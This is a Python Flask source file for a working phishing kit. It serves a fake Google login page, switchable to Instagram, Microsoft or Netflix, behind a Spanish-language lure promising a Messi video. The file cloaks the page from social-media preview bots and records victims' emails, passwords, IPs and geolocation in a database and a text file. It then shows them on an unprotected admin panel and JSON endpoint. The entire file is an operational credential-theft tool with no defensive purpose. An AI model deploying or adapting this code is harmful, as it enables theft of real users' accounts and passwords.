#!/usr/bin/env python3
import os
from flask import Flask, request, render_template_string, redirect, jsonify
import sqlite3
import json
import requests
from datetime import datetime
import re

app = Flask(__name__)

def init_db():
    conn = sqlite3.connect('credentials.db')
    cursor = conn.cursor()
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS credentials (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            timestamp TEXT,
            ip TEXT,
            username TEXT,
            password TEXT,
            user_agent TEXT,
            referer TEXT,
            geo_location TEXT
        )
    ''')
    conn.commit()
    conn.close()

def get_template():
    try:
        with open('config.json', 'r') as f:
            config = json.load(f)
            template_name = config.get('template', 'google')
    except:
        template_name = 'google'
    
    google_template = '''
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <link rel="icon" href="data:;base64,iVBORw0KGgo=">
    <meta property="og:title" content="😲 Fuertes declaraciones de Messi" />
    <meta property="og:description" content="El astro argentino revela detalles inéditos de su carrera y futuro" />
    <meta property="og:image" content="https://i.imgur.com/kgo0gfA.png" />
    <meta property="og:image:secure_url" content="https://i.imgur.com/kgo0gfA.png" />
    <meta property="og:image:width" content="1200" />
    <meta property="og:image:height" content="630" />
    <meta property="og:url" content="https://video-messi.onrender.com" />
    <meta property="og:type" content="video.other" />
    <meta property="og:site_name" content="Messi Declaraciones" />
    <meta property="og:video" content="https://i.imgur.com/kgo0gfA.png" />
    <meta property="og:video:width" content="1280" />
    <meta property="og:video:height" content="720" />
    <meta name="twitter:card" content="player" />
    <meta name="twitter:title" content="😲 Fuertes declaraciones de Messi" />
    <meta name="twitter:description" content="El astro argentino revela detalles inéditos" />
    <meta name="twitter:image" content="https://i.imgur.com/kgo0gfA.png" />
    <meta name="twitter:player" content="https://video-messi.onrender.com" />
    <meta name="twitter:player:width" content="1280" />
    <meta name="twitter:player:height" content="720" />
    <title>😲 Fuertes declaraciones de Messi</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Roboto', sans-serif; }
        body { background: #f0f2f5; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
        .container { background: white; padding: 48px 40px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); width: 450px; text-align: center; }
        .logo { width: 75px; margin-bottom: 20px; }
        h1 { font-size: 24px; font-weight: 400; margin-bottom: 10px; color: #202124; }
        p { color: #5f6368; margin-bottom: 30px; }
        input { width: 100%; padding: 13px 15px; margin-bottom: 15px; border: 1px solid #dadce0; border-radius: 4px; font-size: 16px; }
        input:focus { outline: none; border-color: #1a73e8; }
        button { width: 100%; padding: 12px; background: #1a73e8; color: white; border: none; border-radius: 4px; font-size: 16px; cursor: pointer; }
        button:hover { background: #1557b0; }
        .footer { margin-top: 30px; font-size: 14px; color: #5f6368; }
        .hidden-video { display: none; }
    </style>
</head>
<body>
    <div class="hidden-video">
        <video width="1280" height="720">
            <source src="https://i.imgur.com/kgo0gfA.png" type="video/mp4">
        </video>
    </div>
    <div class="container">
        <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" class="logo" alt="Google">
        <h1>Iniciar sesión</h1>
        <p>Utiliza tu cuenta de Google para ver el video completo</p>
        <form action="/capture" method="POST">
            <input type="email" name="email" placeholder="Correo electrónico" required>
            <input type="password" name="password" placeholder="Contraseña" required>
            <button type="submit">Siguiente</button>
        </form>
        <div class="footer">Verificación de seguridad requerida</div>
    </div>
</body>
</html>'''
    
    templates = {
        'google': google_template,
        'instagram': google_template.replace('Google', 'Instagram').replace('google', 'instagram'),
        'microsoft': google_template.replace('Google', 'Microsoft').replace('google', 'microsoft'),
        'netflix': google_template.replace('Google', 'Netflix').replace('google', 'netflix')
    }
    
    return templates.get(template_name, templates['google'])

@app.route('/')
def index():
    user_agent = request.headers.get('User-Agent', '').lower()
    if any(bot in user_agent for bot in ['facebookexternalhit', 'facebot', 'twitterbot', 'linkedinbot']):
        return render_template_string('''
        <!DOCTYPE html>
        <html>
        <head>
            <meta property="og:title" content="😲 Fuertes declaraciones de Messi" />
            <meta property="og:description" content="El astro argentino revela detalles inéditos de su carrera y futuro" />
            <meta property="og:image" content="https://i.imgur.com/kgo0gfA.png" />
            <meta property="og:image:width" content="1200" />
            <meta property="og:image:height" content="630" />
            <meta property="og:url" content="https://video-messi.onrender.com" />
            <meta property="og:type" content="video.other" />
            <meta property="og:video" content="https://i.imgur.com/kgo0gfA.png" />
            <meta name="twitter:card" content="player" />
            <meta name="twitter:title" content="😲 Fuertes declaraciones de Messi" />
            <meta name="twitter:image" content="https://i.imgur.com/kgo0gfA.png" />
        </head>
        <body>
            <h1>Messi Declaraciones</h1>
            <p>Video exclusivo</p>
        </body>
        </html>
        ''')
    return render_template_string(get_template())

@app.route('/capture', methods=['POST'])
def capture():
    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    if ip and ',' in ip:
        ip = ip.split(',')[0].strip()
    try:
        geo = requests.get(f"http://ip-api.com/json/{ip}", timeout=5).json()
        if geo.get('status') == 'success':
            location = f"{geo.get('city', 'Unknown')}, {geo.get('country', 'Unknown')}"
        else:
            location = "Unknown"
    except:
        location = "Unknown"
    username = request.form.get('email') or request.form.get('username', '')
    password = request.form.get('password', '')
    data = {
        'timestamp': datetime.now().isoformat(),
        'ip': ip,
        'username': username,
        'password': password,
        'user_agent': request.headers.get('User-Agent', ''),
        'referer': request.headers.get('Referer', ''),
        'geo_location': location
    }
    try:
        conn = sqlite3.connect('credentials.db')
        cursor = conn.cursor()
        cursor.execute('''
            INSERT INTO credentials (timestamp, ip, username, password, user_agent, referer, geo_location)
            VALUES (?, ?, ?, ?, ?, ?, ?)
        ''', (data['timestamp'], data['ip'], data['username'], data['password'], 
              data['user_agent'], data['referer'], data['geo_location']))
        conn.commit()
        conn.close()
        with open('credentials.txt', 'a', encoding='utf-8') as f:
            f.write(f"{data['timestamp']} | {data['ip']} | {data['username']} | {data['password']} | {data['geo_location']}\n")
    except Exception as e:
        print(f"Error guardando: {e}")
    return redirect("https://www.google.com")

@app.route('/api/credentials')
def api_credentials():
    try:
        conn = sqlite3.connect('credentials.db')
        cursor = conn.cursor()
        cursor.execute('SELECT * FROM credentials ORDER BY id DESC LIMIT 100')
        data = cursor.fetchall()
        conn.close()
        return jsonify(data)
    except:
        return jsonify({"error": "Error al obtener datos"})

@app.route('/admin')
def admin():
    try:
        conn = sqlite3.connect('credentials.db')
        cursor = conn.cursor()
        cursor.execute('SELECT * FROM credentials ORDER BY id DESC LIMIT 50')
        data = cursor.fetchall()
        conn.close()
        html = '''
        <!DOCTYPE html>
        <html>
        <head>
            <title>Admin - Credenciales</title>
            <style>
                body { font-family: Arial; padding: 20px; background: #f0f0f0; }
                table { width: 100%; border-collapse: collapse; background: white; }
                th, td { padding: 10px; border: 1px solid #ddd; text-align: left; }
                th { background: #1a73e8; color: white; }
                tr:nth-child(even) { background: #f9f9f9; }
                .count { background: white; padding: 15px; border-radius: 5px; margin-bottom: 20px; }
            </style>
        </head>
        <body>
            <h1>📊 Panel de Administración</h1>
            <div class="count">
                <strong>Total capturas:</strong> ''' + str(len(data)) + '''
            </div>
            <table>
                <tr>
                    <th>ID</th>
                    <th>Fecha</th>
                    <th>IP</th>
                    <th>Usuario</th>
                    <th>Contraseña</th>
                    <th>Ubicación</th>
                </tr>
        '''
        for row in data:
            html += f'''
                <tr>
                    <td>{row[0]}</td>
                    <td>{row[1]}</td>
                    <td>{row[2]}</td>
                    <td>{row[3]}</td>
                    <td>{row[4][:20]}{'...' if len(row[4]) > 20 else ''}</td>
                    <td>{row[7]}</td>
                </tr>
            '''
        html += '''
            </table>
        </body>
        </html>
        '''
        return html
    except:
        return "Error al cargar el panel"

if __name__ == '__main__':
    init_db()
    port = int(os.environ.get('PORT', 8080))
    print("="*50)
    print("🚀 SERVIDOR INICIADO CORRECTAMENTE")
    print("="*50)
    print(f"📌 URL: http://localhost:{port}")
    print("="*50)
    app.run(host='0.0.0.0', port=port, debug=False)
